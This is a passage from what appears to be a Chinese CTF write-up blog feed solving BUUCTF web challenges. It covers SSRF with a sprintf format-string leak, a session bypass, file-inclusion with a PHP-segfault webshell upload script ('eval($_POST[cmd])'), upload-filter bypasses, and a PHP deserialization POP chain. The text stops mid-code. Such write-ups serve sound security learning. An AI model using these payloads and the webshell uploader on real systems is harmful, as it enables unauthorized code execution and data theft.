name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>重点关注后半段PHP代码，我们可以获取到以下的限制条件：</p><p>1.不能包含有flag字符串</p><p>2.q2的值必须以<code>http://127.0.0.1/</code>开头，其实相当于是限制了只能通过SSRF读取文件</p><p>3.POST获取了q1、q2、q3三个值，其中q1值并没有什么限制，q2后会拼接“.y1ng.txt”字符串，q3中需要以GET或POST字符串开头。</p><p>首先是无法直接读取到flag文件，通过home.php文件的源码我们可以猜测应该还存在admin.php文件。其次就是我们传进去的URL即q2值会被拼接上无用字符串，我们可以通过在URL后加 “?a=(GET赋值给一个参数)” 或 “#(锚点)” 来让其失效，</p><p>最后一个考的点就是在这两行代码上：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure><p>这里牵扯到了字符串的格式化的知识，%d会将$detect以二进制数的形式输出，所以并不能得到我们需要的源码。</p><p>而主要思路就是让$detect以字符串形式（%s）来输出，我们有两种读取admin.php源码的方法：</p><ul><li><code> %1$s</code> —— 这种办法原理是<code>%1$s</code>会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect));  &#x2F;&#x2F; %1$s会以字符串格式输出$detect，而%d会输出0</span><br></pre></td></tr></table></figure><ul><li><code>%s% </code>—— 这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect));  &#x2F;&#x2F; %d前的%被转义</span><br></pre></td></tr></table></figure><p>构造出Payload，POST发送给system.php即可获得<code>admin.php</code>的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;q3&#x3D;GET%1$s </span><br></pre></td></tr></table></figure><p><code>admin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;爬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码中第一层if循环else代码块中的mt_srand随机数是真随机数，不能爆破。这里有一个Trick：</p><blockquote><p>session绕过。删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的$_SESSION[‘var’]就为NULL，相当于传参NULL。</p><p><a href="https://www.jianshu.com/p/9c031dee57b7">https://www.jianshu.com/p/9c031dee57b7</a></p></blockquote><p>所以只要我们在访问admin.php时，删除session访问，代码就会变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cipher &#x3D; aesEn(&#39;&#39;, &#39;y1ng&#39;);</span><br></pre></td></tr></table></figure><p>因此我们就可以计算出密钥，从而获得Flag。</p><p>把加密算法改一下得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function aesEn($data, $key)&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.0.2&#39;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo aesEn(&#39;&#39;, &#39;y1ng&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712125104.png" alt=""></p><h2 id="NPUCTF2020-ezinclude">NPUCTF2020 ezinclude</h2><h3 id="考点-v6">考点</h3><ul><li>文件包含</li><li>php Segfault</li></ul><h3 id="解题-v6">解题</h3><p>一进来提示 uername/password error，看的我一脸懵逼。查看网页源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure><p>查看cookie</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155251.png" alt=""></p><p>直接给了Hash值，GET参数pass=Hash值。</p><p>跳转到404页面，但是中间明显有一个location重定向，用bp重放。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155451.png" alt=""></p><p>存在文件包含漏洞，PHP伪协议读物文件</p><p>index.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155706.png" alt=""></p><p>flflflflag.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155752.png" alt=""></p><p>查看PHP版本7.0.3，可以使用PHP Segfault上传shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">file_data = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&quot;&lt;?php eval($_POST[cmd]);&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://db4c33c0-8231-45b5-8aec-dbcadfeb8704.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url=url, files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>flag在phpinfo中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921160053.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF刷题——文件包含&quot;&gt;BUUCTF刷题——文件包含&lt;/h1&gt;
&lt;h2 id=&quot;BSidesCTF2020-Had-a-bad-day&quot;&gt;BSidesCTF2020 Had a bad day&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="文件包含" scheme="http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——文件上传</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-08-18T09:59:14.000Z</published>
    <updated>2020-09-16T05:47:37.133Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Upload">极客大挑战 2019 Upload</h2><h3 id="考点">考点</h3><ul><li>phtml绕过后缀</li><li>script绕过&lt;?</li></ul><h3 id="解题">解题</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818233431.png" alt=""></p><h2 id="ACTF2020-新生赛-Upload">ACTF2020 新生赛 Upload</h2><h3 id="考点-v2">考点</h3><ul><li>phtml后缀绕过</li></ul><h3 id="解题-v2">解题</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818232047.png" alt=""></p><h2 id="GXYCTF2019-BabyUpload">GXYCTF2019 BabyUpload</h2><h3 id="考点-v3">考点</h3><ul><li>.htaccess解析绕过</li></ul><h3 id="解题-v3">解题</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819085908.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819090013.png" alt=""></p><h2 id="RoarCTF-2019-SimpleUpload">RoarCTF 2019 SimpleUpload</h2><h3 id="考点-v4">考点</h3><ul><li>条件竞争</li></ul><h3 id="解题-v4">解题</h3><p>根据报错信息，发现是ThinkPHP3.2.4版本，从GitHub上下载下来审计一下，发现上传模块有一个问题。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819104409.png" alt=""></p><p>可以看到，用户所写得代码使用时未指定files，默认为<code>$_FILES</code>，这意味着，所有<code>$_FILES</code>中的文件都会被上传。而代码只会过滤<code>$_FILES['file']</code>中的文件。所以上传两个文件，一个name为file的正常图片，另一个name为其他的webshell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>最后会打印出<code>$_FILES['file']</code>的文件地址，而不会打印我们shell的地址。</p><p>ThinkPHP3默认使用uniqid()函数根据时间生成文件名，两个文件上传时间相近可以爆破。</p><p>最后上传的php会被后台替换成flag。</p><h2 id="强网杯-2019-Upload">强网杯 2019 Upload</h2><h3 id="考点-v5">考点</h3><ul><li>PHP反序列化POP链构造</li></ul><h3 id="解题-v5">解题</h3><p>注册之后查看cookie发现是一个base64编码后的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>扫目录得到 <code>www.tar.gz</code> 压缩包，代码审计</p><p>用PHPStorm打开会发现有两个断点，应该是给的hint</p><p><code>Register.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164356.png" alt=""></p><p><code>Index.php</code>中有一个把cookie反序列化的地方。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164417.png" alt=""></p><p>这么来看应该是构造反序列化的POP链。</p><p>在<code>Profile.php</code>发现关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里肯定是利用<code>__call</code>函数去执行我们的命令了。</p><p>构造POP链先找<code>__destruct</code>方法，很明显刚刚<code>Register.php</code>中就有析构函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们用<code>Register-&gt;checker = Profile</code>，利用<code>Profile-&gt;index()</code>去触发<code>Profile</code>类中的<code>__call</code>魔术方法。</p><p>但是我们可以看到<code>Profile.php</code>当中的<code>__call</code>方法调用的参数是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过文档我们可以知道<code>$name</code>是不存在方法的调用的名字，在这里也就是<code>index</code>，<code>$arguments</code>就是传入调用方法的参数，这里就为空。</p><p>而当使用<code>$this-&gt;index</code>的时候，我们会触发另一个魔术方法<code>__get</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又调用了<code>$this-&gt;except[$name]</code>，而<code>$name</code>我们可以通过<code>__call</code>调用的值确定为<code>index</code>，而且<code>Profile</code>类存在一个公有类<code>except</code>可以供我们修改。</p><p>接着利用<code>_get</code>的返回会使<code>__call</code>方法中的<code>if</code>为真，执行<code>$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</code>。</p><p>有了POP链之后，我们应该去调用什么函数呢，接着看<code>Profile.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span 